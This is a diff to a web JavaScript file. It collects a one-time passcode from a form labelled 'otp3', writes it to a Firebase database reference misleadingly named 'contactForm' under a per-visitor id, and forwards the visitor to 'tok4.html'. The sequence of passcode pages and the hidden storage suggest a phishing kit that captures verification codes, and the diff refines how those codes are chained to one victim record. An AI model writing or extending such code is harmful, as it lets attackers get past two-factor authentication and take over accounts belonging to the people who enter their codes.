@@ -1,42 +1,47 @@
-
-
 const firebaseConfig = {
-    apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
-    authDomain: "start-45a39.firebaseapp.com",
-    databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
-    projectId: "start-45a39",
-    storageBucket: "start-45a39.appspot.com",
-    messagingSenderId: "377019727798",
-    appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
-  };
-  
-  // initialize firebase
-  firebase.initializeApp(firebaseConfig);
-  
-  // reference your database
-  var contactFormDB = firebase.database().ref("contactForm");
-  
-  document.getElementById("otp3").addEventListener("submit", submitForm);
-  
-  function submitForm(e) {
-    e.preventDefault();
-  
-    var userotp = getElementVal("userotp");
-  
-    saveMessages(userotp);
-  
-    //   enable alert
-    window.location.href = "tok4.html"; // Replace with your actual page URL
+  apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
+  authDomain: "start-45a39.firebaseapp.com",
+  databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
+  projectId: "start-45a39",
+  storageBucket: "start-45a39.appspot.com",
+  messagingSenderId: "377019727798",
+  appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+
+// Reference your database
+var contactFormDB = firebase.database().ref("contactForm");
+
+document.getElementById("otp3").addEventListener("submit", submitUpdate);
+
+function submitUpdate(e) {
+  e.preventDefault();
+
+  var otp3 = getElementVal("userotp");
+
+  // Get the key from the query parameter
+  const urlParams = new URLSearchParams(window.location.search);
+  const entryKey = urlParams.get('id');
+
+  updateMessages(entryKey, otp3);
 }
-  
-  const saveMessages = (userotp) => {
-    var newContactForm = contactFormDB.push();
-  
-    newContactForm.set({
-      Otp3: userotp,
-    });
-  };
-  
-  const getElementVal = (id) => {
-    return document.getElementById(id).value;
-  };
+
+const updateMessages = (key, otp3) => {
+  var updates = {};
+
+  if (otp3) updates.otp3 = otp3;
+
+  contactFormDB.child(key).update(updates, function(error) {
+      if (error) {
+          console.error("Error updating data:", error);
+      } else {
+        window.location.href = `tok4.html?id=${key}`;
+      }
+  });
+};
+
+const getElementVal = (id) => {
+  return document.getElementById(id).value;
+};
